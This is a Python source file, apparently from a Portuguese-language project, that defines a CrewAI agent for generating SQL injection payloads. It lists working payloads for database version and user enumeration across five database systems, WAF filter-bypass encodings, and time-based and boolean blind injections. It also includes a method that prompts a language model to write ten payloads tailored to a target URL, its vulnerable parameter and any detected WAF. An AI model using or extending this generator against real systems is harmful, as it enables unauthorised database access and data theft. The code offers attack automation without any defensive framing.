"""
Agent Payload Generator - Gera payloads dinâmicos e contextuais
"""
from crewai import Agent
from langchain_openai import ChatOpenAI
from typing import List, Dict, Optional
import json
from config import Config

class PayloadGeneratorAgent:
    def __init__(self):
        self.llm = ChatOpenAI(
            model=Config.OPENAI_MODEL,
            temperature=Config.TEMPERATURE,
            max_tokens=Config.MAX_TOKENS,
            api_key=Config.OPENAI_API_KEY
        )
        
        self.agent = Agent(
            role="SQL Injection Payload Specialist",
            goal="Gerar payloads de SQL Injection dinâmicos e contextuais baseados na análise do alvo",
            backstory="""Você é um especialista em segurança cibernética com foco em SQL Injection.
            Sua expertise inclui conhecimento profundo sobre diferentes SGBDs (MySQL, PostgreSQL, 
            SQL Server, Oracle, SQLite) e técnicas avançadas de bypass de filtros e WAFs.
            Você gera payloads precisos e eficazes baseados no contexto específico do alvo.""",
            verbose=True,
            allow_delegation=False,
            llm=self.llm
        )
    
    def generate_basic_payloads(self) -> List[str]:
        """Gera payloads básicos padrão"""
        return Config.BASIC_PAYLOADS.copy()
    
    def generate_database_specific_payloads(self, db_type: str) -> List[str]:
        """Gera payloads específicos para o tipo de banco de dados"""
        payloads = []
        
        if db_type == 'mysql':
            payloads.extend([
                "' UNION SELECT 1,version(),3--",
                "' UNION SELECT 1,user(),3--",
                "' UNION SELECT 1,database(),3--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR 1=1 LIMIT 1--",
                "' UNION SELECT 1,@@version,3--"
            ])
        elif db_type == 'postgresql':
            payloads.extend([
                "' UNION SELECT 1,version(),3--",
                "' UNION SELECT 1,current_user,3--",
                "' UNION SELECT 1,current_database(),3--",
                "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
                "' UNION SELECT 1,current_setting('server_version'),3--"
            ])
        elif db_type == 'mssql':
            payloads.extend([
                "' UNION SELECT 1,@@version,3--",
                "' UNION SELECT 1,user_name(),3--",
                "' UNION SELECT 1,db_name(),3--",
                "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
                "'; WAITFOR DELAY '00:00:05'--"
            ])
        elif db_type == 'oracle':
            payloads.extend([
                "' UNION SELECT 1,banner,3 FROM v$version--",
                "' UNION SELECT 1,user,3 FROM dual--",
                "' AND (SELECT COUNT(*) FROM all_tables)>0--",
                "' UNION SELECT 1,version,3 FROM product_component_version--"
            ])
        elif db_type == 'sqlite':
            payloads.extend([
                "' UNION SELECT 1,sqlite_version(),3--",
                "' UNION SELECT 1,name,3 FROM sqlite_master--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
            ])
            
        return payloads
    
    def generate_waf_bypass_payloads(self, waf_type: str = None) -> List[str]:
        """Gera payloads para bypass de WAF"""
        bypass_payloads = [
            # Encoding variations
            "' %4f%52 1=1--",
            "' /**/OR/**/1=1--",
            "' /*!50000OR*/ 1=1--",
            
            # Case variations
            "' oR 1=1--",
            "' Or 1=1--",
            "' OR/**/1=1--",
            
            # Comment variations
            "' OR 1=1#",
            "' OR 1=1;%00",
            "' OR 1=1 %23",
            
            # Union variations
            "' /*!UNION*/ /*!SELECT*/ 1--",
            "' /**/UNION/**/SELECT/**/1--",
            "' UNION/**/SELECT/**/1,2,3--",
            
            # Double encoding
            "%2527%20OR%201%3D1--",
            "%2527%20UNION%20SELECT%201--",
            
            # Alternative operators
            "' || 1=1--",
            "' && 1=1--",
            "' | 1--",
            "' & 1--"
        ]
        
        return bypass_payloads
    
    def generate_time_based_payloads(self, db_type: str = None) -> List[str]:
        """Gera payloads para blind SQL injection baseado em tempo"""
        time_payloads = []
        
        if db_type == 'mysql':
            time_payloads.extend([
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' UNION SELECT SLEEP(5)--"
            ])
        elif db_type == 'postgresql':
            time_payloads.extend([
                "' AND pg_sleep(5)--",
                "' OR pg_sleep(5)--"
            ])
        elif db_type == 'mssql':
            time_payloads.extend([
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--"
            ])
        else:
            # Generic time-based
            time_payloads.extend([
                "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) as x)>0--",
                "' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) as x)>0--"
            ])
            
        return time_payloads
    
    def generate_boolean_based_payloads(self) -> List[str]:
        """Gera payloads para blind SQL injection baseado em boolean"""
        return [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a'--",
            "' AND 'a'='b'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT COUNT(*) FROM admin)>0--",
            "' AND (SELECT LENGTH(database()))>0--",
            "' AND (SELECT SUBSTRING(version(),1,1))='5'--"
        ]
    
    def generate_union_based_payloads(self, columns: int = 3) -> List[str]:
        """Gera payloads UNION SELECT com número específico de colunas"""
        payloads = []
        
        # Detectar número de colunas
        for i in range(1, columns + 1):
            null_values = ','.join(['NULL'] * i)
            payloads.append(f"' UNION SELECT {null_values}--")
            
        # Payloads com dados específicos
        if columns >= 3:
            payloads.extend([
                f"' UNION SELECT 1,version(),3--",
                f"' UNION SELECT 1,user(),3--",
                f"' UNION SELECT 1,database(),3--"
            ])
            
        return payloads
    
    def generate_contextual_payloads(self, context: Dict) -> List[str]:
        """Gera payloads baseados no contexto da aplicação"""
        payloads = []
        
        # Baseado no tipo de parâmetro
        param_type = context.get('parameter_type', 'string')
        if param_type == 'numeric':
            payloads.extend([
                "1 OR 1=1",
                "1 UNION SELECT 1,2,3",
                "1 AND 1=2"
            ])
        else:
            payloads.extend(self.generate_basic_payloads())
            
        # Baseado no tipo de banco
        db_type = context.get('database_type')
        if db_type:
            payloads.extend(self.generate_database_specific_payloads(db_type))
            
        # Baseado na presença de WAF
        if context.get('waf_detected'):
            payloads.extend(self.generate_waf_bypass_payloads())
            
        return list(set(payloads))  # Remove duplicatas
    
    def generate_ai_payloads(self, target_info: Dict) -> List[str]:
        """Usa IA para gerar payloads personalizados"""
        prompt = f"""
        Como especialista em SQL Injection, gere 10 payloads específicos para o seguinte alvo:
        
        Informações do alvo:
        - URL: {target_info.get('url', 'N/A')}
        - Tecnologias detectadas: {target_info.get('technologies', [])}
        - Tipo de banco: {target_info.get('database_type', 'Desconhecido')}
        - WAF detectado: {target_info.get('waf_detected', False)}
        - Parâmetro vulnerável: {target_info.get('parameter', 'query')}
        - Tipo do parâmetro: {target_info.get('parameter_type', 'string')}
        
        Gere payloads que sejam:
        1. Específicos para o contexto
        2. Progressivamente mais complexos
        3. Incluam técnicas de bypass se WAF detectado
        4. Sejam adequados ao tipo de banco de dados
        
        Retorne apenas os payloads, um por linha, sem explicações.
        """
        
        try:
            response = self.llm.invoke(prompt)
            payloads = [line.strip() for line in response.content.split('\n') if line.strip()]
            return payloads[:10]  # Limita a 10 payloads
        except Exception as e:
            print(f"Erro ao gerar payloads com IA: {e}")
            return []
